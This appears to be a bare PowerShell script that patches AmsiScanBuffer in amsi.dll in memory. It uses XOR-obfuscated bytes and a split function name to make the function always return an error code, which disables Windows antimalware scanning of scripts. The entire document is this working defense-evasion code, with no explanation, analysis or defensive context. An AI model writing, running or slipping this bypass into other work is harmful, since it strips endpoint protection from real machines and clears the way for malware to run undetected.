Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;
$buff1 = [Byte[]] (0xb9, 0x26, 0x05, 0x67, 0x09, 0x68)
$buff2 = [Byte[]] (0x01, 0x23, 0x45, 0x67, 0x89, 0xab)

$patch = [Byte[]]::new($buff1.Length)

for ($i = 0; $i -lt $buff1.Length; $i++) {
    $patch[$i] = $buff1[$i] -bxor $buff2[$i]
}

$hModule = [Kernel32]::LoadLibrary("amsi.dll");
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
$lpflOldProtect = 0;
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
$marshal = [System.Runtime.InteropServices.Marshal];
$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;